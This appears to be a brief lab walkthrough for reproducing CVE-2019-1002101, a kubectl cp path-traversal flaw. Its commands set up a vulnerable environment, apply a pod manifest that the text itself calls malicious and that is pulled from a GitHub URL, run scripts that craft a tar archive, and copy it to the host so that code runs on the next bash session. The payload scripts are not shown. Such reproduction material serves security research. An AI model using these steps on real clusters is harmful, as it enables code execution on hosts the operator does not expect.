To perform the Proof of Concept, please follow the below steps:

1. Prepare the environment using the following command in metarget's folder : `./metarget cnv install cve-2016-5195`
2. Prepare the malicious Pod using the following command: `kubectl apply -f https://raw.githubusercontent.com/haseeb62/CVEs/main/CVE-2019-1002101/POC/ubuntu.yaml`
3. Exec in the pod and execute the scripts to prepare malicious files 
  `kubectl exec -it ubuntu -- /bin/bash`
  `./setupTar.sh`
  `./createPwnTar.sh`
  
  
4. In the host, execute a copy command to copy a file from the pod to the host:
`sudo kubectl cp ubuntu:/tmp/twist twist`
  

5. Open a new bash session and the command in line 17 of createPwnTar.sh will be executed successfully.
